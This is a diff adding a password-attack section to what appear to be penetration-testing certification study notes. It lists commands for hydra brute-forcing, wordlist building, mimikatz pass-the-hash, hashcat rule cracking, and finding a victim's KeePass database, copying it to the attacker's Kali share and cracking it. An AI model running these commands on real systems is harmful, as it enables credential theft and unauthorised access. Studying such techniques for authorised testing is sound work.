@@ -134,6 +134,30 @@ To automate the process, use the following tools
 - SQLMAP using request file:
 -     sqlmap -r <request file from burp.txt> -p <Injection Parameter> [Options]
 
+-----------------------------------------------------------------Password Attack-------------------------------------------------------------------------
+use the following website for the rainbow table attack
+-     https://md5hashing.net/
+- hydra
+-     hydra -l <username> -P /rockyou.txt <IP> http-post-form "<PATH>:<REQUEST_FROM_BURP>:<ERROR MESSAGE>"
+- cewl is a tool for generating a custom password list. just give it a link
+-     cewl <https://link> -m 8 > pass.txt
+- hashid is a tool for checking the type of the hash
+-     hashid '<hash>'
+- pass the hash attack in cmd
+-     sekurlsa::pth /user:Administrator /domain:localhost /ntlm:32asdjfklajsdfjaslkfjalsjflks
+- rule based attack
+- rule file can be as the following
+-     $1 c $! --> $1 add 1 at the end of the password file. c to make the first letter capital. $! add ! at the end of the password file ex. Password1!
+-     hashcat -m <hashtype> <hash file> <rockyou.txt> -r <rule file> --force
+- password manager (keypass) has the extension of .kdbx
+- search all files that have extension of .kdbx using PowerShell
+-     Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
+- share/copy the keepass file to kali machine
+-     copy .\Documents\Database.kdbx \\<IP>\share\Database.kdbx
+- crake the pass using keepass2john
+-     keepass2john <keepass file> > keepass.hash
+- don't forget to delete the file name at the beginning of the file then use hashcat to crack the hash
+-     hashcat -m 13400  <keepass.hash> <password list> -r <rule file> --force
 Platforms
 1. for Initial Access work on eJPT, This article and official content 
 Windows Privilege Escalation use TCM security, official content, YouTube videos
